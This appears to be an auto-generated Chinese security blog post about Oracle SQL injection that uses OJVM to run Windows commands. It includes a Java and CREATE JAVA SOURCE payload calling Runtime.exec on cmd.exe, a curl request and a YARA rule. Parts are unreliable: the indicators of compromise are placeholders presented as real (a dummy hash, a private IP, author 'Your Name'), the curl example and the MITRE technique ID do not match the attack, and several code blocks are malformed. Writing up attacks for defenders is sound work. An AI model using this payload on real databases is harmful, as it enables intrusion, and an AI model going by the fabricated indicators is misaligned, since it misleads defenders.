---
layout: post
title:  "研究人員揭露駭客入侵Oracle資料庫，並以Oracle為跳板在Windows執行惡意指令的手法"
date:   2026-08-08 01:06:10 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Oracle 資料庫 SQL 注入攻擊：利用 Java 虛擬機器繞過傳統防禦
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: SQL 注入、Java 虛擬機器、OJVM、oraexec 手法

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Oracle 資料庫的 SQL 注入漏洞是由於未能檢查輸入內容安全性，導致攻擊者可以注入惡意 SQL 代碼。
* **攻擊流程圖解**:
  1. 攻擊者發送惡意 SQL 請求。
  2. Oracle 資料庫執行惡意 SQL 代碼。
  3. 攻擊者利用 OJVM 將 Java 原始碼寫入資料庫引擎中。
  4. Java 原始碼被編譯成內部物件。
  5. 攻擊者利用 SQL 指令執行內部物件。
* **受影響元件**: Oracle 資料庫 12c、19c、21c。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Oracle 資料庫的使用權限。
* **Payload 建構邏輯**:

    ```
    
    java
    // Java 原始碼
    public class Khunt {
        public static void main(String[] args) {
            // 執行系統命令
            Runtime.getRuntime().exec("cmd.exe /c dir");
        }
    }
    
    ```
```

sql
// SQL 注入 payload
CREATE OR REPLACE JAVA SOURCE NAMED "Khunt" AS
  'public class Khunt {
    public static void main(String[] args) {
      // 執行系統命令
      Runtime.getRuntime().exec("cmd.exe /c dir");
    }
  }';

```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      http://example.com/vulnerable-page \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -d 'username=admin&password=oracle'
    
    ```
* **繞過技術**: 攻擊者可以利用 OJVM 繞過傳統防禦機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/khunt.jar |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Oracle_Khunt {
      meta:
        description = "Detects Oracle Khunt malware"
        author = "Your Name"
      strings:
        $a = "CREATE OR REPLACE JAVA SOURCE NAMED"
        $b = "Khunt"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**:
  1. 更新 Oracle 資料庫至最新版本。
  2. 啟用 Oracle 資料庫的安全功能。
  3. 限制使用者權限。
  4. 監控 Oracle 資料庫的日誌。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OJVM (Oracle Java Virtual Machine)**: Oracle 資料庫內建的 Java 虛擬機器，允許 Java 原始碼在資料庫引擎中執行。
* **SQL 注入 (SQL Injection)**: 一種攻擊技術，利用未檢查的輸入內容注入惡意 SQL 代碼。
* **oraexec 手法**: 一種利用 OJVM 繞過傳統防禦機制的攻擊技術。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177979)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


